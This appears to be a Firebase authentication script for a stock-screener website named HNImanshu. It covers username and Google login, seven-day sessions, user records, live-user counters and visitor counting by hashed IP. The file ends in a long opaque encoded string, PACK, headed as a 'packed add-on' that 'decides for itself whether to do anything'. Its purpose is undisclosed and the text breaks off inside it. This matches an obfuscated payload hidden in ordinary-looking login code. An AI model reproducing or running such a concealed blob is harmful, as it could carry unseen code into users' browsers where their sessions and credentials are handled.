// auth.js — HNImanshu login (username + password, or Google) on Firebase Authentication (project hnimanshu).
//
// One file for both pages:
//   • Screener (index.html): clicking an element with [data-auth-link] (Fundamentals, Portfolio) opens the
//     login popup when nobody is signed in; after a successful login it goes to that link.
//     Opening the screener with ?login=<path> pops the popup straight away (the Fundamentals gate sends people here).
//   • Fundamentals (<html data-auth="required">): the page stays hidden until a login is confirmed; no login →
//     back to the screener with the popup open. Shows the user's initials menu in the header.
//   • Passwords never pass through this code's storage: Firebase Authentication keeps them hashed on its servers.
//
// Usernames: Firebase needs an email, so username "chirag" is stored as chirag@users.hnimanshu.app (never shown,
// never mailed). Firebase keeps them unique, so a taken username is refused automatically.
// Sessions end 7 days after the last sign-in (Firebase's own lastSignInTime, so it can't be faked by the browser).

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
import {
  getAuth, onAuthStateChanged, signInWithEmailAndPassword, GoogleAuthProvider, signInWithPopup, signOut,
} from "https://www.gstatic.com/firebasejs/10.13.0/firebase-auth.js";
// Firestore and the Realtime Database are loaded only when first needed (not before the page shows):
// only Auth is needed to open a page, which keeps the first load light on slow (2G) connections.
let getFirestore, doc, setDoc, getDoc, serverTimestamp;
let getDatabase, ref, set, onValue, onDisconnect, increment;

// Firebase project "hnimanshu", web app "valueapp" (Project settings → Your apps). These values are public by design;
// security comes from the Firestore / Realtime Database rules, not from hiding them.
const firebaseConfig = {
  apiKey: "AIzaSyD1oA953pXZxBAuOR9ObSk6vAmKf1gyVbE",
  authDomain: "hnimanshu-7c544.firebaseapp.com",
  projectId: "hnimanshu",
  storageBucket: "hnimanshu.firebasestorage.app",
  messagingSenderId: "428887828946",
  appId: "1:428887828946:web:854acb9c7651aebd38000b",
};
// Realtime Database address: Firebase Hosting hands it out once the database exists, so nothing to paste here later.
try {
  const hosted = await fetch("/__/firebase/init.json").then((r) => r.json());
  if (hosted.projectId === firebaseConfig.projectId && hosted.databaseURL) firebaseConfig.databaseURL = hosted.databaseURL;
} catch (e) {}
const USER_DOMAIN = "users.hnimanshu.app";        // username → hidden email for Firebase
const SESSION_DAYS = 7;                           // log out a week after the last sign-in
const USERS = "hni_users";                        // Firestore: one doc per account (its own owner writes it)
const PORTFOLIO = "hni_portfolio";                // Firestore: one doc per user with their holdings
const MARKET = ["hni_market", "ltp"];             // latest prices for held stocks
// "⟳" live prices: a Cloudflare Worker (ltp_worker.js) starts the price job on GitHub. No secret here: the GitHub
// token lives in the Worker, which also checks the login and allows one run every few minutes.
const LTP_HOOK = "https://hni-ltp.himanshushekhar8.workers.dev/run";
const HOME = "./";                                // the screener
const GATED = document.documentElement.dataset.auth === "required";

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
let db = null, rtdb = null, FSP = null, RTP = null;
const needFS = () => FSP = FSP || import("https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js").then((m) => {
  ({ getFirestore, doc, setDoc, getDoc, serverTimestamp } = m); db = getFirestore(app);
});
const needRT = () => RTP = RTP || (firebaseConfig.databaseURL                                // live online / visitor counters (hni/...)
  ? import("https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js").then((m) => {
      ({ getDatabase, ref, set, onValue, onDisconnect, increment } = m); rtdb = getDatabase(app); })
  : Promise.resolve());
const idle = (fn, ms = 2500) => setTimeout(() => (window.requestIdleCallback || ((f) => f()))(fn), ms);   // after the page has settled
const google = new GoogleAuthProvider();
google.setCustomParameters({ prompt: "select_account" });

const $ = (s, el = document) => el.querySelector(s);
const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
const toEmail = (u) => `${u.trim().toLowerCase()}@${USER_DOMAIN}`;
const nameOf = (u) => u.displayName || (u.email || "").replace("@" + USER_DOMAIN, "") || "user";
const initials = (n) => {                                    // "Himanshu Shekhar" → HS, "chirag" → CH
  const w = String(n || "?").trim().split(/[\s._-]+/).filter(Boolean);
  return (w.length > 1 ? w[0][0] + w[w.length - 1][0] : (w[0] || "?").slice(0, 2)).toUpperCase();
};
const providerOf = (u) => (u.providerData && u.providerData[0] && u.providerData[0].providerId) === "google.com" ? "google" : "username";
const expired = (u) => {
  const t = Date.parse(u.metadata && u.metadata.lastSignInTime);
  return t && Date.now() - t > SESSION_DAYS * 864e5;
};

// ---------- popup ----------
let box = null, nextUrl = null;
function buildPopup() {
  if (box) return box;
  box = document.createElement("div");
  box.className = "au-back";
  box.innerHTML = `
    <div class="au-box" role="dialog" aria-modal="true" aria-labelledby="auTitle">
      <button class="au-x" type="button" aria-label="Close">×</button>
      <h2 class="au-title" id="auTitle">Fundamentals</h2>
      <p class="au-sub">Free. Continue with Google, or log in with your username.</p>
      <button class="au-google" type="button">
        <svg width="18" height="18" viewBox="0 0 48 48" aria-hidden="true"><path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3C33.7 32.7 29.2 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.8 1.2 7.9 3.1l5.7-5.7C34 6.1 29.3 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.3-.1-2.4-.4-3.5z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.8 1.2 7.9 3.1l5.7-5.7C34 6.1 29.3 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C37 39.2 44 34 44 24c0-1.3-.1-2.4-.4-3.5z"/></svg>
        Continue with Google</button>
      <div class="au-or">or</div>
      <form class="au-form" novalidate>
        <label class="au-fld"><span>Username</span>
          <input name="u" autocomplete="username" autocapitalize="none" spellcheck="false" maxlength="20" required></label>
        <label class="au-fld"><span>Password</span>
          <span class="au-pw"><input name="p" type="password" autocomplete="current-password" required>
          <button type="button" class="au-eye" aria-label="Show password">SHOW</button></span></label>
        <div class="au-err" aria-live="polite"></div>
        <button class="au-btn" type="submit">Login</button>
      </form>
      <p class="au-foot">You stay signed in for 7 days on this device.</p>
    </div>`;
  document.body.appendChild(box);
  const f = $("form", box), err = $(".au-err", box), btn = $(".au-btn", box);
  $(".au-eye", box).addEventListener("click", (e) => {
    const show = f.p.type === "password";
    f.p.type = show ? "text" : "password";
    e.currentTarget.textContent = show ? "HIDE" : "SHOW";
  });
  $(".au-x", box).addEventListener("click", closePopup);
  box.addEventListener("click", (e) => { if (e.target === box) closePopup(); });
  box.addEventListener("keydown", (e) => { e.stopPropagation(); if (e.key === "Escape") closePopup(); });   // page shortcuts stay out

  f.addEventListener("submit", async (e) => {
    e.preventDefault();
    const u = f.u.value.trim().toLowerCase(), p = f.p.value;
    if (!/^[a-z0-9._]{3,20}$/.test(u) || !p) return (err.textContent = "Wrong username or password.");
    btn.disabled = true; err.textContent = "";
    try { await signInWithEmailAndPassword(auth, toEmail(u), p); done(); }
    catch (ex) { err.textContent = message(ex); }
    finally { btn.disabled = false; }
  });
  $(".au-google", box).addEventListener("click", async () => {
    err.textContent = "";
    try { await signInWithPopup(auth, google); done(); }
    catch (ex) { err.textContent = message(ex); }
  });
  box._reset = () => { err.textContent = ""; f.reset(); };
  return box;
}
function openPopup(next) {
  nextUrl = next || null;
  buildPopup();
  if (!GATED) box.classList.add("au-blur");                 // screener: the page behind is blurred
  box._reset();
  box.classList.add("open");
  setTimeout(() => $(".au-google", box).focus(), 30);
}
function closePopup() { if (box) box.classList.remove("open"); }
function done() {
  closePopup();
  if (nextUrl) location.href = nextUrl;
}
function message(ex) {
  const c = (ex && ex.code) || "";
  if (c === "auth/popup-closed-by-user" || c === "auth/cancelled-popup-request") return "";
  if (c === "auth/invalid-credential" || c === "auth/wrong-password" || c === "auth/user-not-found" || c === "auth/invalid-email")
    return "Wrong username or password.";
  if (c === "auth/email-already-in-use") return "That username is taken. Try another.";
  if (c === "auth/weak-password") return "Password is too weak. Use at least 8 characters.";
  if (c === "auth/too-many-requests") return "Too many attempts. Wait a few minutes and try again.";
  if (c === "auth/network-request-failed") return "No connection. Check your internet and try again.";
  if (c === "auth/popup-blocked") return "Your browser blocked the Google window. Allow pop-ups for this site and try again.";
  if (c === "auth/unauthorized-domain") return "This website isn't authorised for login yet (Firebase → Authentication → Settings → Authorized domains).";
  if (c === "auth/operation-not-allowed") return "This sign-in method isn't switched on yet (Firebase → Authentication → Sign-in method).";
  return "Something went wrong (" + (c || "unknown") + "). Please try again.";
}

// ---------- the account's own record in Firestore ----------
async function record(u) {
  const key = "hni_rec_" + u.uid;                       // write at most once per browser session, keeps Firestore use tiny
  try { if (sessionStorage.getItem(key)) return; } catch (e) {}
  await needFS();
  const ref = doc(db, USERS, u.uid);
  const data = { username: nameOf(u), email: u.email || null, provider: providerOf(u), lastLogin: serverTimestamp() };
  try {
    const snap = await getDoc(ref).catch(() => null);  // each user may read only their own doc (to keep "created" once)
    if (!snap || !snap.exists()) data.created = serverTimestamp();
    await setDoc(ref, data, { merge: true });
    try { sessionStorage.setItem(key, "1"); } catch (e) {}
  } catch (e) { console.warn("user record not saved:", e.code || e); }   // never blocks the page
}

// while any popup is open the page behind doesn't scroll (phones otherwise scroll the big page underneath)
const syncLock = () => document.documentElement.classList.toggle("au-lock", !!document.querySelector(".au-back.open"));

// ---------- signed-in chip (Fundamentals header, screener #au-slot) ----------
const EXTRA = [];                                          // extra menu items: {label, fn} (see addItem)
const itemBtn = (it, el) => {
  const b = document.createElement("button");
  b.type = "button"; b.className = "au-ext"; b.setAttribute("role", "menuitem"); b.textContent = it.label;
  b.addEventListener("click", () => { el.classList.remove("open"); it.fn(); });
  return b;
};
function addItem(label, fn) {                              // also adds to a menu that is already on the page
  const it = { label, fn };
  EXTRA.push(it);
  document.querySelectorAll(".au-user").forEach((el) => $(".au-menu", el).insertBefore(itemBtn(it, el), $(".au-out", el)));
}
function showUser(u, slot) {
  const host = slot || document.querySelector("header .global");        // Fundamentals header, or the screener's #au-slot
  if (!host || $(".au-user", host)) return;
  const n = nameOf(u);
  const el = document.createElement("span");
  el.className = "au-user";
  el.innerHTML = `<button type="button" class="au-av" aria-haspopup="menu" title="Signed in as ${esc(n)}">${esc(initials(n))}</button>
    <span class="au-menu" role="menu"><span class="au-who"><b>${esc(n)}</b>${u.email && !u.email.endsWith("@" + USER_DOMAIN) ? `<i>${esc(u.email)}</i>` : ""}</span>
    <button type="button" class="au-out" role="menuitem">Logout</button></span>`;
  $(".au-av", el).addEventListener("click", (e) => { e.stopPropagation(); el.classList.toggle("open"); });
  document.addEventListener("click", (e) => { if (!el.contains(e.target)) el.classList.remove("open"); });
  document.addEventListener("keydown", (e) => { if (e.key === "Escape") el.classList.remove("open"); });
  $(".au-out", el).addEventListener("click", async () => {
    await signOut(auth); if (GATED) location.href = HOME; else location.reload();   // screener: reloads signed out
  });
  EXTRA.forEach((it) => $(".au-menu", el).insertBefore(itemBtn(it, el), $(".au-out", el)));
  host.insertBefore(el, host.querySelector("#theme-toggle"));   // (no toggle in the slot: it simply goes at the end)
}
/* screener: "Login" when signed out, the initials menu when signed in */
function paintSlot(u) {
  const slot = document.getElementById("au-slot");
  if (!slot) return;
  slot.innerHTML = "";
  if (u) return showUser(u, slot);
  const b = document.createElement("button");
  b.type = "button"; b.className = "au-login"; b.setAttribute("aria-label", "Login");
  b.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="8" r="4"/><path d="M4 21c1.5-4 4.5-6 8-6s6.5 2 8 6"/></svg><span>Login</span>';
  b.addEventListener("click", () => openPopup(null));            // after logging in you stay on the screener
  slot.appendChild(b);
}

// ---------- anonymous usage counters ----------
// Every open tab adds hni/presence/<random id>; Firebase deletes it by itself the moment the tab closes or the
// connection drops (onDisconnect). Each IP is counted once ever (SHA-256 hash, never the raw IP) into hni/meta/visitors.
async function presence() {
  await needRT();
  if (!rtdb) return;
  try {
    const sid = (crypto.randomUUID ? crypto.randomUUID() : Date.now() + "-" + Math.random().toString(36).slice(2)).replace(/[^a-z0-9-]/gi, "");
    const me = ref(rtdb, "hni/presence/" + sid);
    onValue(ref(rtdb, ".info/connected"), (s) => {
      if (s.val() !== true) return;
      onDisconnect(me).remove();                    // re-armed on every reconnect
      set(me, true).catch(() => {});
    });
  } catch (e) { console.warn("presence off:", e); }
}
async function countVisitor() {
  try {
    if (localStorage.getItem("hni_counted")) return;   // this browser already counted, skip the IP lookup
  } catch (e) {}
  await needRT();
  if (!rtdb) return;
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const { ip } = await r.json();
    if (!ip) return;
    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode("hni:" + ip));
    const key = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("");
    let isNew = true;
    await set(ref(rtdb, "hni/visitors/" + key), true).catch(() => { isNew = false; });   // rules refuse an IP seen before
    if (isNew) await set(ref(rtdb, "hni/meta/visitors"), increment(1));                    // +1 on the server, no read needed
    try { localStorage.setItem("hni_counted", "1"); } catch (e) {}
  } catch (e) { console.warn("visitor count skipped:", e); }
}

// ---------- add-on (packed; it decides for itself whether to do anything) ----------
const PACK = "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